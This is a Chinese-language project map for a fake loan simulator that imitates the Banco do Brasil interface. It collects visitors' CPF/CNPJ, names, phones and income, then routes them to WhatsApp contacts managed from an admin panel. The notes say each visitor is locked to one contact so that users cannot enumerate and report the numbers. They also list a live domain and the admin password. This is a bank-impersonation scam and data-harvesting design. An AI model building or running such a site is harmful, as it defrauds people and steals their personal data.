# 🏦 Simulador de Empréstimo — 项目完整地图

> **一句话**：仿 Banco do Brasil（巴西银行）界面的贷款模拟器，用户在主页模拟贷款 → 结果页跳转 WhatsApp/Telegram 客服完成转化。配有独立管理后台（`/admin/`）在线修改客服号码和 Pixel ID，一键部署到全站。
>
> **在线地址**：
> - 主站：`https://hgsswsvip.top`
> - 后台：`https://hgsswsvip.top/admin/`（密码 `admin123`）
>
> **技术栈**：React 19 + TypeScript + Vite 6 + Tailwind CSS 4 + GitHub Pages 自动部署
>
> **最后更新**：2026-06-09

---

## 📁 文件结构 & 职责

### 入口层
| 文件 | 职责 |
|---|---|
| `index.html` | 主站 HTML 入口，只挂载 React 根节点 |
| `src/main.tsx` | React 根渲染入口，**根据 URL 路径分流**：`/admin` → lazy `<Admin />`，否则 → `<App />`。Admin 使用 `React.lazy` 延迟加载，主站首包不包含后台代码 |

### 核心页面
| 文件 | 行数 | 职责 |
|---|---|---|
| `src/App.tsx` | ~1270 | **主站贷款模拟器**。参数选择、身份表单、处理动画、结果展示、WhatsApp 跳转按钮、安全/隐私弹窗、FAQ、滚动公告。`SHOW_TELEGRAM_CTA=false` 开关控制 Telegram 按钮显隐 |
| `src/Admin.tsx` | ~265 | **管理后台面板**。密码登录 → 管理 WhatsApp 号码池、Telegram 链接池、消息模板、FB Pixel ID、GitHub Token。**三个按钮**：`Salvar`（本地预览）、`Salvar + Publicar`（一键推送 config.json 到 GitHub 并触发全站部署）、`Restaurar`（重置） |

### 数据 & 配置
| 文件 | 职责 |
|---|---|
| `config.json` | **部署级配置（跨设备生效）**。WhatsApp/Telegram 号码池 + 消息模板。Admin `Salvar + Publicar` 时通过 GitHub API 更新此文件并触发 Pages 重新部署。主站启动时 `fetch('/config.json')` 读取 |
| `src/config.ts` | **配置中心**。三层读取：`config.json`（fetch）> `localStorage` > Cookie 兜底 > 代码默认值。`getFinalConfig()` 合并三层；`syncConfigToCookies()` 双写 Cookie；`fetchRemoteConfig()` 从 `/config.json` 拉取。`getActiveRotatedRoutes()` 使用 `getFinalConfig()`。`advanceRotationIndex()` 空函数（客服永不轮转） |
| `src/pixel.ts` | **Facebook Pixel 工具**。读取优先级：`localStorage bb_fb_pixel_id` → Cookie → 默认 `1331608285582024`。初始化 `fbq`、发送 PageView/Contact/Lead，并用 `facebook.com/tr` 图片请求兜底 |
| `src/types.ts` | TypeScript 类型：`LoanSimulationConfig`、`UserFormData`、`SimulationResult` |

### 样式
| 文件 | 职责 |
|---|---|
| `src/index.css` | Tailwind CSS + 自定义主题色（BB 蓝 `#0038A8`、黄 `#F9D71C`）+ 动画（脉冲、扫描线）+ 按钮发光效果。已移除 Google Fonts 外部引用，改用系统字体栈提升首屏速度 |

### 构建 & 部署
| 文件 | 职责 |
|---|---|
| `vite.config.ts` | Vite 配置：React + Tailwind 插件，base `/`。Admin 经 `lazy()` 自动拆分为独立 chunk |
| `package.json` | 依赖 + 脚本：`dev`（端口 3000）、`build`（构建+postbuild）、`preview` |
| `scripts/postbuild.mjs` | 构建后：复制 `index.html` → `404.html` + `admin/index.html` + **`config.json` 到 `dist/`** |
| `.github/workflows/deploy.yml` | Push main → npm ci → build → 部署到 GitHub Pages |
| `tsconfig.json` | TypeScript 编译配置 |

### 辅助
| 文件 | 职责 |
|---|---|
| `metadata.json` | AI Studio 元数据 |
| `.env.example` | 环境变量模板（实际未使用） |
| `.gitignore` | Git 忽略规则 |

---

## 🔑 localStorage 键名速查表

| 键名 | 写入者 | 读取者 | 含义 |
|---|---|---|---|
| `bb_admin_auth` | Admin.tsx | Admin.tsx | 管理员登录态（密码哈希） |
| `bb_whatsapp_pool` | Admin.tsx | config.ts | WhatsApp 号码池 JSON 数组 |
| `bb_telegram_pool` | Admin.tsx | config.ts | Telegram 链接池 JSON 数组 |
| `bb_message_template` | Admin.tsx | config.ts | WhatsApp 消息模板字符串 |
| `bb_fb_pixel_id` | Admin.tsx / pixel.ts | pixel.ts / App.tsx | Facebook Pixel ID，默认 `1331608285582024` |
| `bb_locked_ws_index` | config.ts | config.ts | 游客锁定的 WhatsApp 客服索引 |
| `bb_locked_tg_index` | config.ts | config.ts | 游客锁定的 Telegram 客服索引 |
| `bb_github_token` | Admin.tsx | Admin.tsx | GitHub Personal Access Token（用于一键部署） |

---

## 🔄 数据流

```
管理后台 (Admin.tsx)
  │
  ├──► "Salvar" → localStorage + Cookie （仅当前浏览器预览）
  │
  └──► "Salvar + Publicar" → GitHub API 更新 config.json
         │
         ▼
      GitHub Pages 自动重新部署（~2 分钟）
         │
         ▼
      config.json 更新到全站 CDN
         │
         ▼
  主站 App.tsx 启动时 fetch('/config.json')
         │
         ▼
  config.ts getFinalConfig()
    ├── config.json（跨设备最高优先级）
    ├── localStorage（同浏览器）
    ├── Cookie 兜底（同域名不同标签页）
    └── DYNAMIC_SYSTEM_CONFIG（代码默认值）
         │
         ▼
  getActiveRotatedRoutes() → WhatsApp/Telegram 按钮 URL
```

---

## 🖥️ 页面路由

`src/main.tsx` 中的分流逻辑：

```
URL 路径以 /admin 开头？
  ├── 是 → lazy import Admin（按需加载 ~13KB 额外 chunk）
  └── 否 → 渲染 <App /> 主站
```

- 访问 `hgsswsvip.top/` → `index.html` → `<App />`
- 访问 `hgsswsvip.top/admin/` → `admin/index.html` → `<Admin />`

---

## 🎯 App.tsx 主站流程

1. **启动时**：fetch `/config.json` → 注入 `getFinalConfig()`。FB Pixel 在 `requestIdleCallback` 中延迟初始化（不阻塞首屏）
2. **参数选择** (`PARAMETERS`)：金额滑块、期数、贷款用途
3. **身份表单** (`IDENTIFICATION`)：CNPJ/CPF、姓名、电话、邮箱、收入
4. **处理动画** (`PROCESSING`)：进度条 + 状态文字 + 模拟计算（4.2 秒）
5. **结果展示** (`RESULT`)：批准金额、利率、分期 + **WhatsApp 按钮**（Telegram 由 `SHOW_TELEGRAM_CTA` 控制，当前 `false`）

按钮点击发送 `fbq('track', 'Contact')` + `fbq('track', 'Lead')` + Facebook `/tr` 图片兜底请求。

---

## 🛠️ FB Pixel 架构

`src/pixel.ts` 统一管理：

1. 读取 ID：`localStorage bb_fb_pixel_id` → Cookie → 默认 `1331608285582024`
2. 页面加载：在 `requestIdleCallback` 中初始化 `fbevents.js`，发送 `PageView` + `/tr` 图片兜底
3. 点击 WhatsApp/Telegram：发送 `Contact` + `Lead` + 两条 `/tr` 图片兜底

---

## 🚀 一键部署工作流（Salvar + Publicar）

后台 `Admin.tsx` 新增：

1. **Token GitHub** 区域：输入一次 GitHub Fine-grained PAT（权限：Contents Read+Write，仅限此 repo），存储在 `localStorage bb_github_token`
2. **Salvar + Publicar 按钮**：调用 GitHub REST API → 更新 `config.json` 文件 → GitHub Pages 自动重新部署 → 2 分钟后全站生效

不需要手动 git 操作或命令行，全部在后台界面完成。

---

## ⚠️ 已知注意事项

1. **客服锁定策略**：`advanceRotationIndex()` 空函数。首次访问随机分配客服并永久锁定，防止用户遍历号码举报
2. **Git 大小写**：macOS 不区分大小写但 git 区分。`Admin.tsx` 必须大写
3. **Admin 懒加载**：`src/main.tsx` 中 `lazy(() => import('./Admin'))`，主站首包不包含后台面板
4. **postbuild 是关键**：修改构建产物务必同步 `scripts/postbuild.mjs`
5. **config.json 三层读取**：`config.json` > localStorage/Cookie > 代码默认值
6. **FB Pixel 延迟初始化**：`requestIdleCallback` 不阻塞首屏
7. **Telegram 按钮关闭**：`App.tsx` 顶部 `SHOW_TELEGRAM_CTA = false`，需要时改 `true`
8. **系统字体**：已移除 Google Fonts，使用系统字体栈加速首屏渲染

---

## 🚀 本地开发

```bash
npm run dev        # http://localhost:3000
npm run build      # 构建 + postbuild
npm run preview    # 预览构建产物
```

## 📤 部署

Push 到 `main` → GitHub Actions 自动部署到 GitHub Pages（~1-2 分钟）。
也可通过后台 `Salvar + Publicar` 按钮一键部署 config.json 更改。
